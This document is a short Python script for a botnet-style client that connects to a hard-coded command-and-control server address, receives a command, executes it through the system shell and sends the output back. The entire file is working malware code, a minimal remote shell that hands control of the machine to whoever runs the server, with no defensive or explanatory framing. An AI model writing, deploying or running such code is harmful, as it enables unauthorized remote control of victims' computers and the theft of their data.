import socket
import subprocess

# Connection to server C&C
bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bot_socket.connect(("244.178.44.111", 8080))

# Waiting for a command
command = bot_socket.recv(1024).decode().strip()

# Execute the command
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
output = process.stdout.read() + process.stderr.read()

# Send the output back to the server
bot_socket.sendall(output)

# Close the connection
bot_socket.close()

